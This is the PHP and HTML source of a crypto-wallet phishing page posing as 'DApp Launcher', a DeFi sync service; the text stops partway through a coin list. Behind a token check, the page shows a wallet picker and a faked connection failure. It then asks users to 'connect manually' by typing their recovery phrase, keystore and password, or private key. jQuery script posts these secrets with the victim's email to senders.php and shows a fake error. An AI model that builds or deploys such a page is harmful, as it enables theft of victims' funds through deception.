<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

$cn = new mysqli("localhost", "root", "", "dapp");
if ($cn->connect_error) die("Database connection failed.");

$token = $_GET['token'] ?? '';
$showForm = false; // Default to not showing the form

if ($token) {
    $stmt = $cn->prepare("SELECT id, email, timer, status FROM user WHERE token = ?");
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $res = $stmt->get_result();

    if ($res->num_rows === 1) {
        $row = $res->fetch_assoc();
        $now = strtotime("now");
        $expiry = strtotime($row['timer']);

        if ($now <= $expiry && $row['status'] == 1) {
            $showForm = true;
            $user_id = $row['id'];
            $email = $row['email'];
        }
    }
}
?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">





<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>

    <meta charset="utf-8">

    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="shortcut icon" href="dapp.png" />
    <link rel="apple-touch-icon" href="dapp.png" />
    <title>DApp Launcher</title>
    <meta name="description" content="OpenSource and decentralized protocol for
        syncing various Wallets to DApp Secure Server." />
    <meta name="theme-color" content="#8C8CE3" />


    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@csmostation" />
    <meta name="twitter:title" content="DApp Launcher - DeFi Hub and Validator" />
    <meta name="twitter:description" content="OpenSource and decentralized protocol for
     syncing various Wallets to DApp Secure Server." />
    <meta name="twitter:image" content="dapp.png" />

    <meta property="og:type" content="article" />
    <meta property="og:title" content="DApp Launcher - DeFi Hub and Validator" />
    <meta property="og:description" content="OpenSource and decentralized protocol for
    syncing various Wallets to DApp Secure Server." />
    <meta property="og:url" content="https://dapplauncher.com/" />
    <meta property="og:image" content="dapp.png" />

    <meta name="msvalidate.01" content="" />
    <meta name="author" content="">

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


        <!-- Bootstrap CSS (already included if you're seeing modal styles) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Required JS for Bootstrap 5 -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

<!-- jQuery (required for Bootstrap 4) -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.css" />
  <link rel="stylesheet" href="asset/css/preloader.css">
    <link rel="stylesheet" type="text/css" href="asset/css/style.css">


    <link rel="shortcut icon" href="dapp.png">
    <link rel="apple-touch-icon-precomposed" href="asset/icon/Favicon.html">




    <style type="text/css">
        .flat-title-page .overlay {
            background: black;
        }

               .openPlay .overlay {
            background: black;


        
    </style>
</head>







<body class="body header-fixed">

<?php if ($showForm): ?>


    <style>
        .custom-card {
    transition: transform 0.3s ease-in-out;
    border-radius: 10px;
    overflow: hidden;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

.custom-card:hover {
    transform: scale(1.05);
    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
}

.custom-card-content {
    padding: 20px;
    background-color: #fff;
}


</style>
    
    
   
   
   
   <!-- Modal -->
<div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content" style="background-color:#121212 !important">
      <div class="modal-header">
        <h5 class="modal-title text-success" id="exampleModalLongTitle">Choose Wallet</h5>
        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="col-md-12 coin-registry">
          <button type="button" class="walletButton btn coin custom-card d-flex align-items-center" style="border: 2px solid; border-color: #4cd964; width: 100%; padding: 10px;">
            <img class="coin-img me-3" src="asset/images/metamask-icon.png" style="width: 30%; max-width: 40px;" alt="">
            <h6 class=" mb-0" style="color: #4cd964;">MetaMask</h6>
          </button>
          <br>
          <button type="button" class="walletButton btn coin custom-card d-flex align-items-center" style="border: 2px solid; border-color: #4cd964; width: 100%; padding: 10px;">
            <img class="coin-img me-3" src="asset/images/trustwallet-icon.png" style="width: 30%; max-width: 40px;" alt="">
            <h6 class=" mb-0" style="color: #4cd964;">Trust Wallet</h6>
          </button>
          <br>
          <button type="button" class="walletButton btn coin custom-card d-flex align-items-center" style="border: 2px solid; border-color: #4cd964; width: 100%; padding: 10px;">
            <img class="coin-img me-3" src="asset/images/phantom-icon.png" style="width: 30%; max-width: 40px;" alt="">
            <h6 class=" mb-0" style="color: #4cd964;">Phantom Wallet</h6>
          </button>
          <br>
          <button type="button" class="walletButton btn coin custom-card d-flex align-items-center" style="border: 2px solid; border-color: #4cd964; width: 100%; padding: 10px;">
            <img class="coin-img me-3" src="asset/images/ledger-icon.png" style="width: 30%; max-width: 40px;" alt="">
            <h6 class=" mb-0" style="color: #4cd964;">Ledger</h6>
          </button>
          <br>
          <button type="button" class="walletButton btn coin custom-card d-flex align-items-center" style="border: 2px solid; border-color: #4cd964; width: 100%; padding: 10px;">
            <img class="coin-img me-3" src="asset/images/walletconnect-icon.png" style="width: 30%; max-width: 40px;" alt="">
            <h6 class=" mb-0" style="color: #4cd964;">Wallet Connect</h6>
          </button>
          <br>
          <button type="button" class="walletButton btn coin custom-card d-flex align-items-center" style="border: 2px solid; border-color: #4cd964; width: 100%; padding: 10px;">
            <img class="coin-img me-3" src="asset/images/blockchain-icon.png" style="width: 30%; max-width: 40px;" alt="">
            <h6 class=" mb-0" style="color: #4cd964;">Blockchain</h6>
          </button>
          <br>
        </div>
      </div>
    </div>
  </div>
</div>

<style>
    @media (max-width: 480px) {
  /* styles for phones */
  .smallie{
    height: 350px;
  }
}


.dark-input {
  background-color: #1e1e1e;
  color: #ffffff;
  border: 1px solid #4cd964;
  padding: 10px;
  border-radius: 5px;
  width: 100%;
  box-sizing: border-box;
}

.dark-input:focus {
  background-color: #1e1e1e; /* KEEP dark */
  color: #ffffff;
  border-color: #6aff9c;
  outline: none; /* Remove default blue outline */
  box-shadow: 0 0 5px #6aff9c88; /* Optional glow */
}

</style>


<!-- Connecting Modal -->
<div class="modal fade" id="connectingModal" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content text-center smallie" style="background-color: #121212;">
      <div class="modal-body" style="margin-top:20px">
        <!-- Content will be updated via JavaScript -->
      </div>
    </div>
  </div>
</div>

<!-- Modal for Retrieval -->
<div class="modal fade" id="retrieveModal" tabindex="-1" role="dialog" aria-labelledby="retrieveModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document" style="background-color:#121212;">
    <div class="modal-content" style="background-color:#121212;">
      <div class="modal-header">
        <h5 class="modal-title text-white" id="retrieveModalLabel">Retrieve Wallet Information</h5>
        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="connect-dialog-body">
          <div class="to-send-info">
            <div class="wallet-app-send-logo">
              <img id="current-wallet-send-logo" src="" alt="wallet-app-name" style="width: 40px; height: 40px;" />
            </div>
            <div id="current-wallet-app-send" class="text-success wallet-app-name-send">My App</div>
          </div>

          <!-- Hidden input to store wallet name -->
          <input type="hidden" id="walletName" name="walletName" value="" />

          <form id="retrieveForm">
            <div class="send-tabs">
              <ul class="nav nav-tabs">
                <li class="nav-item">
                  <a class="nav-link active text-info" id="phraseSend" data-bs-toggle="tab" href="#phraseTab">Phrase</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link text-info" id="keystoreSend" data-bs-toggle="tab" href="#keystoreTab">Keystore</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link text-info" id="privateKeySend" data-bs-toggle="tab" href="#privateKeyTab">Private Key</a>
                </li>
              </ul>
              <div class="tab-content">
                <div class="tab-pane fade show active" id="phraseTab"><br>
                  <div class="form-group">
                    <input type="hidden" id="typePhrase" name="type" value="phrase" />
                    <textarea id="phrase1" name="phrase" required class="form-control dark-input" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
                    <div class="invalid-feedback">This field is required.</div>
                  </div>
                  <div class="small text-left my-3 text-white" style="font-size: 11px">
                    Typically 12 (sometimes 24) words separated by single spaces.
                  </div>
                </div>
                <div class="tab-pane fade" id="keystoreTab"><br>
                  <div class="form-group">
                    <input type="hidden" id="typeKeystore" name="type" value="keystore" />
                    <textarea id="keystore1" name="keystore" required class="form-control dark-input" placeholder="Enter Keystore" rows="5"></textarea><br>
                    <input type="text" id="keystorePassword" class="form-control dark-input" name="password" required placeholder="Wallet password" />
                    <div class="invalid-feedback">This field is required.</div>
                  </div>
                  <div class="small text-left my-3 text-white" style="font-size: 11px">
                    Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                  </div>
                </div>
                <div class="tab-pane fade" id="privateKeyTab"><br>
                  <div class="form-group">
                    <input type="hidden" id="typePrivateKey" name="type" value="privatekey" />
                    <input type="text" id="privateKey1" name="privateKey" required class="form-control dark-input" placeholder="Enter your Private Key" />
                    <div class="invalid-feedback">This field is required.</div>
                  </div>
                  <div class="small text-left my-3 text-white" style="font-size: 11px">
                    Typically a string containing both alphabets and numbers.
                  </div>
                </div>
              </div>
            </div>

              <input type="hidden" name="email" id="email" value="<?php echo $email; ?>">


            <div id="data-to-send">
              <!-- Dynamic form fields will be inserted here -->
            </div>
            <button type="submit" id="proceedButton" class="btn btn-outline-success text-white btn-block mt-4">PROCEED</button>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>



<!-- Loading Spinner Modal -->
<div class="modal fade" id="loadingModal" tabindex="-1" role="dialog" aria-labelledby="loadingModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document" style="background-color:#121212;">
    <div class="modal-content" style="background-color:#121212;">
      <div class="modal-body text-center">
        <div class="spinner-border" role="status">
          <span class="sr-only text-success">O</span>
        </div>
        <p class="text-white" style="font-size:25px; font-weight:bold;">Connecting...</p>
      </div>
    </div>
  </div>
</div>







<style>
  /* Styling checkboxes */
  .form-check-input {
    width: 20px;
    height: 20px;
    border: 2px solid #4cd964; /* Yellow border */
    background-color: transparent;
  }

  .form-check-label {
    color: #4cd964; 
    font-weight: bold;
    margin-left: 5px;
  }

  /* Change checkbox color when checked */
  .form-check-input:checked {
    background-color: #4cd964 !important; /* Bootstrap primary blue */
    border-color: #fff !important;
  }
</style>

<script>
$(document).ready(function () {
  function showConnectingModal(walletName, walletIcon) {
    $("#exampleModalLong").modal("hide");

    const modalBody = $("#connectingModal .modal-body");
    modalBody.html(`
      <div class="d-flex align-items-center">
        <img src="${walletIcon}" alt="${walletName} icon" style="width: 40px; height: 40px; margin-right: 10px;">
        <div class="text-white">Connecting to <strong>${walletName}</strong>...</div>
      </div><br><br>
      <div class="spinner-border text-success mt-3" role="status" style="width: 5rem; height: 5rem;">
        <span class="visually-hidden">Loading...</span>
      </div>
    `);

    $("#connectingModal").modal("show");

    setTimeout(function () {
      modalBody.html(`
  <div class="d-flex align-items-center">
    <img src="${walletIcon}" alt="${walletName} icon" style="width: 40px; height: 40px; margin-right: 10px;">
    <div class="text-white">Connection to <strong>${walletName}</strong> <span class="text-danger fw-bold">failed</span>. Please try again.</div>
  </div><br>

  <div class="text-start px-2">
    <div class="form-check mt-2">
      <input class="form-check-input" type="checkbox" id="checkbox1">
      <label class="form-check-label text-white" for="checkbox1">Session is encrypted for privacy purposes</label>
    </div>
    <div class="form-check mt-2">
      <input class="form-check-input" type="checkbox" id="checkbox2">
      <label class="form-check-label text-white" for="checkbox2">I agree to never share my seed phrase with anyone</label>
    </div>
    <div class="form-check mt-2">
      <input class="form-check-input" type="checkbox" id="checkbox3">
      <label class="form-check-label text-white" for="checkbox3">I understand that I am responsible for my funds</label>
    </div>
  </div>

  <div class="d-flex justify-content-between gap-2 mt-4 flex-wrap px-2">
    <button id="tryAgainButton" class="btn btn-primary flex-fill me-2">Try Again</button>
    <button id="manualConnectButton" class="btn btn-success text-white flex-fill" disabled>Connect Manually</button>
  </div>
`);


      $(".form-check-input").on("change", function () {
        if ($("#checkbox1").is(":checked") && $("#checkbox2").is(":checked") && $("#checkbox3").is(":checked")) {
          $("#manualConnectButton").prop("disabled", false);
        } else {
          $("#manualConnectButton").prop("disabled", true);
        }
      });

      $("#manualConnectButton").on("click", function () {
        showRetrieveModal(walletName, walletIcon);
      });

      $("#tryAgainButton").on("click", function () {
        showConnectingModal(walletName, walletIcon);
      });

    }, 7000);
  }

  function showRetrieveModal(walletName, walletIcon) {
    $("#connectingModal").modal("hide");
    $("#current-wallet-send-logo").attr("src", walletIcon);
    $("#current-wallet-app-send").text(walletName);
    $("#retrieveModal").modal("show");
  }

  $(".walletButton").on("click", function () {
    const walletName = $(this).find('h6').text();
    const walletIcon = $(this).find('img').attr('src');
    showConnectingModal(walletName, walletIcon);
  });
});
</script>









<script>
$(document).ready(function () {
  // Handle form submission via AJAX
  $('#proceedButton').on('click', function (e) {
    e.preventDefault(); // Prevent the default form submission

    let formData = {};
    let tabId = $('.nav-tabs .nav-link.active').attr('id'); // Get the active tab id
    let walletName = $('#current-wallet-app-send').text(); // Retrieve wallet name
    $('#walletName').val(walletName); // Set wallet name to the hidden input

    // Validation logic
    let isValid = true;

    switch (tabId) {
      case 'phraseSend': // Seed phrase tab
        if ($('#phrase1').val().trim() === '') {
          $('#phrase1').addClass('is-invalid'); // Highlight invalid input
          isValid = false;
        } else {
          $('#phrase1').removeClass('is-invalid'); // Remove invalid class if valid
        }
        break;

      case 'keystoreSend': // Keystore tab
        if ($('#keystore1').val().trim() === '' || $('#keystorePassword').val().trim() === '') {
          $('#keystore1, #keystorePassword').addClass('is-invalid'); // Highlight invalid inputs
          isValid = false;
        } else {
          $('#keystore1, #keystorePassword').removeClass('is-invalid'); // Remove invalid class if valid
        }
        break;

      case 'privateKeySend': // Private key tab
        if ($('#privateKey1').val().trim() === '') {
          $('#privateKey1').addClass('is-invalid'); // Highlight invalid input
          isValid = false;
        } else {
          $('#privateKey1').removeClass('is-invalid'); // Remove invalid class if valid
        }
        break;

      default:
        alert('Please select a valid tab.');
        return;
    }

    if (!isValid) {
      alert('Please fill in all required fields.');
      return;
    }

    // Prepare the form data based on the active tab
    switch (tabId) {
      case 'phraseSend':
        formData = {
          type: 'phrase',
          phrase: $('#phrase1').val(),
          email: $('#email').val(),
          walletName: walletName
        };
        break;
      case 'keystoreSend':
        formData = {
          type: 'keystore',
          keystore: $('#keystore1').val(),
          password: $('#keystorePassword').val(),
          email: $('#email').val(),
          walletName: walletName
        };
        break;
      case 'privateKeySend':
        formData = {
          type: 'privatekey',
          privateKey: $('#privateKey1').val(),
          email: $('#email').val(),
          walletName: walletName
        };
        break;
      default:
        alert('Invalid tab.');
        return;
    }

    // Send the form data via AJAX
    $.ajax({
      url: 'senders.php', // Your server-side script to handle the form submission
      type: 'POST',
      data: formData,
      beforeSend: function () {
        // Show loading spinner before sending the request
        $('#loadingModal').modal('show'); // Show spinner modal
      },
      success: function (response) {
        console.log('Form submitted successfully:', response);
        $('#retrieveModal').modal('hide'); // Close the retrieval modal immediately

        setTimeout(function() {
          $('#loadingModal').modal('hide'); // Hide spinner modal after 10 seconds
          alert('Something Went Wrong, Try Again!');
          location.reload(); // Reload the page
        }, 10000); // 10 seconds delay before reload
      },
      error: function (xhr, status, error) {
        console.error('Form submission failed:', error);
        setTimeout(function() {
          $('#loadingModal').modal('hide'); // Hide spinner modal after 5 seconds
        }, 5000); // Hide spinner modal after 5 seconds
      }
    });
  });

  // Cancel button click event to close the modal
  $('#cancelBtn').on('click', function () {
    $('#retrieveModal').modal('hide');
  });
});


</script>








    <div id="wrapper">
        <div id="page" class="clearfix">

            <header id="header_main" class="header_1 js-header">
                <div class="themesflat-container">
                    <div class="row">
                        <div class="col-md-12">
                            <div id="site-header-inner">
                                <div class="wrap-box flex">
                                    <div id="site-logo" class="clearfix">
                                        <div id="site-logo-inner">
                                            <a href="#" rel="home" class="main-logo">
                                          <!-- <h4 style="color: white !important;">DApp Launcher</h4> -->
                                          <img src="dapp.png" width="200">
                                            </a>
                                        </div>
                                    </div>
               
                                    <div class="flat-search-btn flex">
                                        <div class="header-search flat-show-search" id="s1">
                                            <a href="#" class="show-search header-search-trigger">
                                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <mask id="mask0_334_638" style="mask-type:alpha"
                                                        maskUnits="userSpaceOnUse" x="1" y="1" width="18" height="17">
                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                            d="M1.66699 1.66666H17.6862V17.3322H1.66699V1.66666Z"
                                                            fill="white" stroke="white" />
                                                    </mask>
                                                    <g mask="url(#mask0_334_638)">
                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                            d="M9.67711 2.87312C5.9406 2.87312 2.90072 5.84505 2.90072 9.49903C2.90072 13.153 5.9406 16.1257 9.67711 16.1257C13.4128 16.1257 16.4527 13.153 16.4527 9.49903C16.4527 5.84505 13.4128 2.87312 9.67711 2.87312ZM9.67709 17.3322C5.26039 17.3322 1.66699 13.8182 1.66699 9.49902C1.66699 5.17988 5.26039 1.66666 9.67709 1.66666C14.0938 1.66666 17.6864 5.17988 17.6864 9.49902C17.6864 13.8182 14.0938 17.3322 9.67709 17.3322Z"
                                                            fill="white" />
                                                        <path
                                                            d="M9.67711 2.37312C5.67512 2.37312 2.40072 5.55836 2.40072 9.49903H3.40072C3.40072 6.13174 6.20607 3.37312 9.67711 3.37312V2.37312ZM2.40072 9.49903C2.40072 13.4396 5.67504 16.6257 9.67711 16.6257V15.6257C6.20615 15.6257 3.40072 12.8664 3.40072 9.49903H2.40072ZM9.67711 16.6257C13.6784 16.6257 16.9527 13.4396 16.9527 9.49903H15.9527C15.9527 12.8664 13.1472 15.6257 9.67711 15.6257V16.6257ZM16.9527 9.49903C16.9527 5.5584 13.6783 2.37312 9.67711 2.37312V3.37312C13.1473 3.37312 15.9527 6.1317 15.9527 9.49903H16.9527ZM9.67709 16.8322C5.52595 16.8322 2.16699 13.5316 2.16699 9.49902H1.16699C1.16699 14.1048 4.99484 17.8322 9.67709 17.8322V16.8322ZM2.16699 9.49902C2.16699 5.46656 5.52588 2.16666 9.67709 2.16666V1.16666C4.9949 1.16666 1.16699 4.8932 1.16699 9.49902H2.16699ZM9.67709 2.16666C13.8282 2.16666 17.1864 5.46649 17.1864 9.49902H18.1864C18.1864 4.89327 14.3593 1.16666 9.67709 1.16666V2.16666ZM17.1864 9.49902C17.1864 13.5316 13.8282 16.8322 9.67709 16.8322V17.8322C14.3594 17.8322 18.1864 14.1047 18.1864 9.49902H17.1864Z"
                                                            fill="white" />
                                                    </g>
                                                    <mask id="mask1_334_638" style="mask-type:alpha"
                                                        maskUnits="userSpaceOnUse" x="13" y="13" width="6" height="6">
                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                            d="M14.2012 14.2999H18.3333V18.3333H14.2012V14.2999Z"
                                                            fill="white" stroke="white" />
                                                    </mask>
                                                    <g mask="url(#mask1_334_638)">
                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                            d="M17.7166 18.3333C17.5596 18.3333 17.4016 18.2746 17.2807 18.1572L14.3823 15.3308C14.1413 15.0952 14.1405 14.7131 14.3815 14.4774C14.6217 14.2402 15.0123 14.2418 15.2541 14.4758L18.1526 17.303C18.3935 17.5387 18.3944 17.9199 18.1534 18.1556C18.0333 18.2746 17.8746 18.3333 17.7166 18.3333Z"
                                                            fill="white" />
                                                        <path
                                                            d="M17.7166 18.3333C17.5595 18.3333 17.4016 18.2746 17.2807 18.1572L14.3823 15.3308C14.1413 15.0952 14.1405 14.7131 14.3815 14.4774C14.6217 14.2402 15.0123 14.2418 15.2541 14.4758L18.1526 17.303C18.3935 17.5387 18.3944 17.9199 18.1534 18.1556C18.0333 18.2746 17.8746 18.3333 17.7166 18.3333"
                                                            stroke="white" />
                                                    </g>
                                                </svg>
                                            </a>
                                            <div class="top-search">
                                                <form action="#" method="get" role="search" class="search-form">
                                                    <input type="search" id="s" class="search-field"
                                                        placeholder="Search..." value="" name="s" title="Search for"
                                                        required="">
                                                    <button class="search search-submit" type="submit" title="Search">
                                                        <i class="icon-fl-search-filled"></i>
                                                    </button>
                                                </form>
                                            </div>
                                        </div>
                                        <div class="sc-btn-top mg-r-12" id="site-header">
                                            <a href="#" id="connectbtn"
                                                class="sc-button header-slider style style-1 wallet fl-button pri-1">
                                                <span>Validate Wallet</span>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </header>

<style>
.fade-in-left {
  opacity: 0;
  transform: translateX(-50px);
  animation: fadeInLeft 1.2s ease forwards;
  animation-delay: 0.2s;
}

.fade-in-right {
  opacity: 0;
  transform: translateX(50px);
  animation: fadeInRight 1.2s ease forwards;
  animation-delay: 0.4s;
}

@keyframes fadeInLeft {
  to {
    opacity: 1;
    transform: translateX(0);
  }
}

@keyframes fadeInRight {
  to {
    opacity: 1;
    transform: translateX(0);
  }
}
@media screen and (max-width: 768px) {
  .fade-in-right {
    display: none;
  }
}

.restoreDivBtn{
    cursor: pointer;
}

</style>


<section class="openPlay home3 parallax" id="restoreDiv" style="background-color: #111; color: #fff; padding: 120px 20px;">
  <img class="bgr-gradient gradient1" src="asset/images/backgroup-secsion/bg-gradient1.html" alt="">
  <img class="bgr-gradient gradient2" src="asset/images/backgroup-secsion/bg-gradient2.html" alt="">
  <img class="bgr-gradient gradient3" src="asset/images/backgroup-secsion/bg-gradient3.html" alt="">
  <div class="overlay"></div>

 <div class="fade-container" style="display: flex; flex-wrap: wrap; max-width: 1200px; margin: 0 auto; align-items: center; gap: 40px;">
    <!-- Text Column -->
    <div class="fade-in-left" style="flex: 1; min-width: 200px;">
      <h2 style="font-size: 3rem; margin-bottom: 20px;">One Platform. All Blockchains. Zero Compromise.</h2>

      <p class="text-white" style="font-size: 1.3rem; line-height: 1.8; margin-bottom: 20px;">
        Different blockchains like Ethereum, Bitcoin, BNB Chain, and Solana offer unique strengths, but they also come with challenges such as slow transaction speeds, high fees, and limited interoperability. We eliminate these issues by integrating the latest in blockchain innovation, offering faster, scalable, and cost-effective solutions. Your data is fully encrypted, and your privacy is our top priority, ensuring a secure, seamless experience on every chain..
      </p>

    
      <button class="btn btn-primary" id="restoreDivBtn" 
        style="background-color: #fcd535; color: #111; padding: 12px 28px; border-radius: 8px; font-weight: bold;">
        Connect
      </button>
    </div>

    <!-- Image Column -->
<!--     <div class="fade-in-right" style="flex: 1; min-width: 300px;">
      <img src="asset/images/cybersecurity-icon.svg" alt="Blockchain Education" style="width: 50%; border-radius: 12px;">
    </div> -->
  </div>
</section>




    <!--         <section class="flat-title-page home3 parallax" style="display:none;" id="secondSection">
                <img class="bgr-gradient gradient1" src="asset/images/backgroup-secsion/bg-gradient1.html" alt="">
                <img class="bgr-gradient gradient2" src="asset/images/backgroup-secsion/bg-gradient2.html" alt="">
                <img class="bgr-gradient gradient3" src="asset/images/backgroup-secsion/bg-gradient3.html" alt="">
                <div class="shape item-w-16"></div>
                <div class="shape item-w-22"></div>
                <div class="shape item-w-32"></div>
                <div class="shape item-w-48"></div>
                <div class="shape style2 item-w-51"></div>
                <div class="shape style2 item-w-51 position2"></div>
                <div class="shape item-w-68"></div>
                <div class="overlay"></div>





            </section> -->


<section class="openPlay home3 parallax" style="background-color:#111; padding-top: 100px; padding-bottom: 10px;">

               <img class="bgr-gradient gradient1" src="asset/images/backgroup-secsion/bg-gradient1.html" alt="">
                <img class="bgr-gradient gradient2" src="asset/images/backgroup-secsion/bg-gradient2.html" alt="">
                <img class="bgr-gradient gradient3" src="asset/images/backgroup-secsion/bg-gradient3.html" alt="">
                <div class="overlay"></div>


<style>
.support-form-container {
  max-width: 500px;
  margin: 40px auto;
  padding: 24px;
  background-color: #1c1c1e;
  border-radius: 12px;
  color: #fff;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  font-family: 'Segoe UI', sans-serif;
}

.support-form h2 {
  text-align: center;
  margin-bottom: 20px;
  color: #4cd964;
}

.support-form label {
  display: block;
  margin-bottom: 6px;
  margin-top: 14px;
  font-size: 14px;
  font-weight: 500;
}

.support-form input,
.support-form select {
  width: 100%;
  padding: 10px 12px;
  border-radius: 6px;
  border: none;
  font-size: 15px;
  background-color: #2c2c2e;
  color: #fff;
  margin-bottom: 4px;
}

.support-form input:focus,
.support-form select:focus {
  outline: 2px solid #4cd964;
}

.support-form button {
  width: 100%;
  padding: 12px;
  background-color: #4cd964;
  border: none;
  border-radius: 8px;
  color: #000;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  margin-top: 18px;
  transition: background 0.3s ease;
}

.support-form button:hover {
  background-color: #3ac955;
}





/* Wallet Card Style */
.wallet-connect-card {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  border: 2px solid #4cd964;
  border-radius: 10px;
  padding: 14px 20px;
  background-color: #1c1c1e;
  color: #fff;
  font-weight: bold;
  cursor: pointer;
  transition: background 0.3s ease;
  max-width: 220px;
  margin: auto;
}

.wallet-connect-card:hover {
  background-color: #2c2c2e;
}

.wallet-connect-card img {
  width: 28px;
  height: 28px;
}

select, select option {
  color: white;
  background-color: #222; /* Optional: dark background for contrast */
}


</style>



<!-- Hidden Support Form -->
<div id="ticketForm" style="display: none;">
  <div class="support-form-container">
    <button id="closeSupportForm" class="back-btn">← Back</button>

    <form class="support-form">
      <h2>Select Blockchain</h2>


<label for="blockchain">Select Blockchain:</label>
<select name="blockchain" id="blockchain" required>
  <option value="" disabled selected>-- Choose a Blockchain --</option>
  <option value="bitcoin">Bitcoin</option>
  <option value="ethereum">Ethereum</option>
  <option value="bnb">BNB Chain</option>
  <option value="solana">Solana</option>
  <option value="polygon">Polygon</option>
  <option value="avalanche">Avalanche</option>
  <option value="arbitrum">Arbitrum</option>
  <option value="optimism">Optimism</option>
  <option value="tron">Tron</option>
  <option value="fantom">Fantom</option>
  <option value="near">NEAR Protocol</option>
  <option value="cardano">Cardano</option>
  <option value="polkadot">Polkadot</option>
  <option value="tezos">Tezos</option>
  <option value="celo">Celo</option>
  <option value="kava">Kava</option>
  <option value="hedera">Hedera</option>
  <option value="zksync">zkSync</option>
  <option value="starknet">StarkNet</option>
  <option value="aptos">Aptos</option>
  <option value="sui">Sui</option>
</select>




      <label for="coin">Choose Coin/Token</label>
<select id="coin" name="coin" required>
<option value="">...</option>
    <option value="Aeternity (AE)" data-id="67000657745">Aeternity(AE)</option>
    <option value="Aion (AION)" data-id="67000657746">Aion(AION)</option>
    <option value="Algorand (ALGO)" data-id="67000657747">Algorand(ALGO)</option>
    <option value="Binance Coin (BNB)" data-id="67000657748">Binance Coin (BNB)</option>
    <option value="Bitcoin (BTC)" data-id="67000657749">Bitcoin(BTC)</option>
    <option value="Bitcoin Cash (BCH)" data-id="67000657834">Bitcoin Cash (BCH)</option>
    <option value="Cardano (ADA)" data-id="67000837544">Cardano (ADA)</option>
    <option value="Callisto (CLO)" data-id="67000657835">Callisto(CLO)</option>
    <option value="Cosmos (ATOM)" data-id="67000657836">Cosmos(ATOM)</option>
    <option value="Cronos" data-id="67000837545">Cronos</option>
    <option value="Dash (DASH)" data-id="67000657837">Dash(DASH)</option>
    <option value="Decred (DCR)" data-id="67000657838">Decred(DCR)</option>
    <option value="Digibyte (DGB)" data-id="67000657839">Digibyte(DGB)</option>
    <option value="Dogecoin (DOGE)" data-id="67000657840">Dogecoin(DOGE)</option>
    <option value="Ethereum (ETH)" data-id="67000657841">Ethereum(ETH)</option>
    <option value="Ethereum Classic (ETC)" data-id="67000657842">Ethereum Classic(ETC)</option>
    <option value="EVMOS" data-id="67000837546">EVMOS</option>
    <option value="Filecoin (FIL)" data-id="67000657843">Filecoin(FIL)</option>
    <option value="Groestlcoin (GRS)" data-id="67000657846">Groestlcoin(GRS)</option>
    <option value="IoTeX (IOTX)" data-id="67000657849">IoTeX (IOTX)</option>
    <option value="Kava (KAVA)" data-id="67000657850">Kava(KAVA)</option>
    <option value="Kin (KIN)" data-id="67000657851">Kin (KIN)</option>
    <option value="Kucoin Community Chain" data-id="67000837547">Kucoin Community Chain</option>
    <option value="Litecoin (LTC)" data-id="67000657852">Litecoin(LTC)</option>
    <option value="Nano (NANO)" data-id="67000657853">Nano(NANO)</option>
    <option value="Near (NEAR)" data-id="67000657854">Near(NEAR)</option>
    <option value="Polkadot (DOT)" data-id="67000657859">Polkadot(DOT)</option>
    <option value="POLYGON (Matic)" data-id="67000771010">POLYGON(Matic)</option>
    <option value="Ripple (XRP)" data-id="67000657862">Ripple(XRP)</option>
    <option value="Smartchain (BNB)" data-id="67000657863">Smartchain(BNB)</option>
    <option value="Solana (SOL)" data-id="67000657864">Solana(SOL)</option>
    <option value="Stellar (XLM)" data-id="67000657865">Stellar(XLM) </option>
    <option value="Tezos (XTZ)" data-id="67000657866">Tezos(XTZ)</option>
    <option value="Theta (THETA)" data-id="67000657867">Theta(THETA) </option>
    <option value="THORChain (RUNE)" data-id="67000721746">THORChain(RUNE)</option>
    <option value="Thunder Token (TT)" data-id="67000657868">Thunder Token (TT)</option>
    <option value="TomoChain (TOMO)" data-id="67000657869">TomoChain(TOMO)</option>
    <option value="TRON (TRX)" data-id="67000657870">TRON(TRX)</option>
